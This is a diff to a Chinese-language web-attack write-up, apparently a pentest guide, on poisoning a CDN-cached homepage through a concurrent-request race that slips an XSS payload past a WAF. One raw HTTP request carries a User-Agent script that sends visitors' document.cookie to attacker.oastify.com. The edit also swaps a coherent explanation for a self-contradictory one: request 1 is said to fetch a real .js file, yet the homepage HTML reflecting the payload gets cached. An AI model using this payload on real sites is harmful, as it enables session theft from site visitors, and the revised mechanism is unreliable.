@@ -521,11 +521,11 @@ x=1
 
 ### 攻击机制
 
-关键洞察：CDN 对 `.js` 路径的请求**自动缓存**且 WAF 检查更宽松，但对主页面 `/` 的请求应用更严格的检查。通过并发发送两个请求，利用 CDN 路由竞态，使攻击者的恶意 UA 穿透 WAF：
+关键洞察：CDN 对以 `.js` 等静态扩展名结尾的请求**自动缓存**且应用更弱的 WAF 检查（静态资源通常不会反射请求头）。但 CDN 的内部并发路由存在缺陷——一个请求的处理可能影响到另一个并发请求的缓存键分配。通过并发发送两个请求（一个走弱 WAF 的 `.js` 路径+恶意 UA，一个直走 `/`），攻击者的缓存键交叉污染可导致主页被投毒：
 
 ```http
 # 请求 1 — 走 .js 路径绕过严格 WAF（CDN 对此路径检查更弱）
-GET /index.php/script.js HTTP/1.1
+GET /script.js HTTP/1.1
 Host: target.com
 User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
 
@@ -535,7 +535,9 @@ Host: target.com
 User-Agent: Mozilla/5.0 (legitimate)
 ```
 
-**竞争点**：请求 1 通过 `.js` 路径到达源站 → 源站忽略 `/script.js` 后缀 → 实际响应的是 `/index.php` 的 HTML 内容（含反射的恶意 UA → XSS）。由于 CDN 的并发处理，此带毒 HTML 响应被关联到了请求 2 的缓存键（`/` 的缓存桶）。结果：**首页被投毒**，所有后续访问 `/` 的用户获得包含 XSS payload 的页面。
+**竞争点**：请求 1 请求的是**真实的 `.js` 文件**（非路径混淆），由于 CDN 对 `.js` 等静态扩展名路径应用更弱的内容检查，恶意 UA 得以穿透 WAF。CDN 内部的并发路由竞态导致请求 1 触发的缓存行为**污染了请求 2 的缓存键分配**——带毒的主页 HTML 响应被错误地关联到 `/` 的缓存桶。结果：**首页被投毒**，所有后续访问 `/` 的用户获得包含 XSS payload 的页面。
+
+> **注意**：这不是 Web Cache Deception 的路径混淆——两个请求都是对真实路径的请求。攻击依赖的是 CDN 内部路由竞态使并发请求的缓存键发生交叉，而非后端对同一路径的不同解释。
 
 ### 实战操作步骤
 
